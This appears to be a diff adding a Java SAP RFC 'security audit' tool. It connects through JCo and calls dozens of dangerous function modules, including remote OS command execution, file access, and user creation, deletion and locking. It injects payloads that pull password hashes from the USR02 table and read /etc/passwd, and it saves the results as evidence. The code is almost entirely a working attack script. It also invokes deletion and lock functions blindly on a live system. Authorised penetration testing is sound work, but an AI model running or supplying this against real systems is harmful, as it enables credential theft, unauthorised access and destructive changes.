@@ -1,0 +1,144 @@
+import com.sap.conn.jco.*;
+import java.util.*;
+import java.io.*;
+
+public class SapSecurityMegaAudit {
+    private static final String DEST_NAME = "MEGA_AUDIT_DEST";
+
+    public static void main(String[] args) {
+        Properties props = new Properties();
+        // 현장 정보 입력
+        props.setProperty("jco.client.ashost", "SAP_IP");
+        props.setProperty("jco.client.sysnr",  "00");
+        props.setProperty("jco.client.client", "100");
+        props.setProperty("jco.client.user",   "USER_ID");
+        props.setProperty("jco.client.passwd", "PASSWORD");
+
+        try {
+            createDestinationFile(DEST_NAME, props);
+            JCoDestination dest = JCoDestinationManager.getDestination(DEST_NAME);
+            JCoRepository repo = dest.getRepository();
+
+            System.out.println("==================================================");
+            System.out.println("[SAP RFC 취약점 전수 진단 및 증거 수집 시작]");
+            System.out.println("==================================================");
+
+            // [검증 대상 확장 리스트] - 주요 키워드별로 묶음
+            List<String> targets = new ArrayList<>(Arrays.asList(
+                // 1. OS 및 원격 실행 (RCE)
+                "SXPG_COMMAND_EXECUTE", "SXPG_CALL_SYSTEM", "RFC_REMOTE_EXEC", "RFC_REMOTE_PIPE", 
+                "RFC_ABAP_INSTALL_AND_RUN", "CAT_EXECUTE_CLI_COMMAND", "GUI_EXEC", "JOB_CLOSE", "OS_COMMAND_EXECUTE_NO_GEN",
+                
+                // 2. 파일 시스템 접근
+                "RZL_READ_FILE_LOCAL", "RZL_WRITE_FILE_LOCAL", "EPS_GET_DIRECTORY_LISTING", "EPS_FILE_DELETE", 
+                "RS_STP_FILE_SAVE", "ARCHIV_FILE_READ_FROM_NFS", "FIEB_GET_FILE_LIST", "SUBST_GET_FILE_LIST",
+                "RZL_READ_DIR", "RZL_READ_FILE", "ARCHIVFILE_SERVER_TO_CLIENT",
+                
+                // 3. DB 및 테이블 탈취 (가장 중요)
+                "RFC_READ_TABLE", "BBP_RFC_READ_TABLE", "DSY_READ_TABLE", "TH_DB_TABLE_INFO", 
+                "DB_GET_TABLE_FIELDS", "RFC_GET_TABLE_ENTRIES", "VIEW_GET_DATA", "HDB_GET_TABLE_ENTRIES",
+                "STFC_WRITE_TO_TCPIC", "INST_EXECUTE_REPORT",
+                
+                // 4. 권한 및 계정 제어
+                "TH_USER_LIST", "TH_DELETE_USER", "BAPI_USER_GET_DETAIL", "BAPI_USER_CHANGE", 
+                "SUSR_RFC_USER_INTERFACE", "BAPI_USER_LOCK", "BAPI_USER_UNLOCK", "BAPI_USER_CREATE", 
+                "BAPI_USER_DELETE", "BAPI_USER_PROFILES_ASSIGN", "RFC_SYSTEM_INFO", "TH_USER_INFO"
+            ));
+
+            // 업무용 커스텀 함수 추가 (대조군)
+            targets.add("ZFT_RFC_OUTGOING_PMT_INFO");
+            targets.add("ZFT_RFC_CUST_MASTER");
+
+            List<String[]> reportRows = new ArrayList<>();
+            reportRows.add(new String[]{"RFC_NAME", "METADATA", "EXECUTION", "EVIDENCE", "DETAIL"});
+
+            for (String rfc : targets) {
+                reportRows.add(conductAudit(dest, repo, rfc));
+            }
+
+            writeCsv("sap_security_final_report.csv", reportRows);
+            System.out.println("\n[+] 진단 완료! 리포트 저장됨: sap_security_final_report.csv");
+
+        } catch (Exception e) {
+            System.err.println("[!] 치명적 에러: " + e.getMessage());
+        }
+    }
+
+    private static String[] conductAudit(JCoDestination dest, JCoRepository repo, String rfcName) {
+        System.out.print("▶ " + rfcName + " : ");
+        String metadataStatus = "NOT_FOUND";
+        String executionStatus = "NOT_ATTEMPTED";
+        String evidence = "-";
+        String detail = "";
+
+        try {
+            // 1. 메타데이터 점검
+            JCoFunction func = repo.getFunction(rfcName);
+            if (func != null) {
+                metadataStatus = "EXPOSED";
+                
+                // 2. 페이로드 주입 및 실행 점검
+                try {
+                    injectPayload(func, rfcName);
+                    func.execute(dest);
+                    executionStatus = "SUCCESS(VULNERABLE)";
+                    evidence = collectEvidence(func, rfcName);
+                } catch (JCoException e) {
+                    executionStatus = analyzeError(e);
+                    detail = e.getMessage().replace("\n", " ");
+                }
+            }
+        } catch (Exception e) {
+            detail = e.getMessage();
+        }
+
+        System.out.println("[" + metadataStatus + " / " + executionStatus + "]");
+        return new String[]{rfcName, metadataStatus, executionStatus, evidence, detail};
+    }
+
+    private static void injectPayload(JCoFunction func, String rfcName) {
+        try {
+            if (rfcName.contains("READ_TABLE")) {
+                func.getImportParameterList().setValue("QUERY_TABLE", "USR02");
+                func.getImportParameterList().setValue("ROWCOUNT", 1);
+            } else if (rfcName.equals("RZL_READ_FILE_LOCAL")) {
+                func.getImportParameterList().setValue("NAME", "/etc/passwd");
+            } else if (rfcName.equals("BAPI_USER_GET_DETAIL")) {
+                func.getImportParameterList().setValue("USERNAME", "ADMIN");
+            }
+        } catch (Exception ignore) {}
+    }
+
+    private static String collectEvidence(JCoFunction func, String rfcName) {
+        try {
+            if (rfcName.contains("READ_TABLE")) {
+                return "DB Data: " + func.getTableParameterList().getTable("DATA").getString("WA");
+            } else if (rfcName.equals("TH_USER_LIST")) {
+                return "Users: " + func.getTableParameterList().getTable("USRLIST").getNumRows();
+            }
+            return "Execution Confirmed";
+        } catch (Exception e) { return "Data Parsing Error"; }
+    }
+
+    private static String analyzeError(JCoException e) {
+        if (e.getGroup() == 104) return "DENIED(S_RFC)";
+        if (e.getMessage().contains("required") || e.getMessage().contains("empty")) return "POTENTIAL(NEED_PARAMS)";
+        return "ERROR";
+    }
+
+    private static void writeCsv(String fileName, List<String[]> rows) throws IOException {
+        try (BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(fileName), "UTF-8"))) {
+            for (String[] row : rows) {
+                bw.write(String.join(",", Arrays.stream(row).map(s -> "\"" + (s == null ? "" : s.replace("\"", "\"\"")) + "\"").toArray(String[]::new)));
+                bw.newLine();
+            }
+        }
+    }
+
+    private static void createDestinationFile(String name, Properties props) throws Exception {
+        File destFile = new File(name + ".jcoDestination");
+        try (FileOutputStream fos = new FileOutputStream(destFile)) {
+            props.store(fos, "Mega Audit");
+        }
+    }
+}
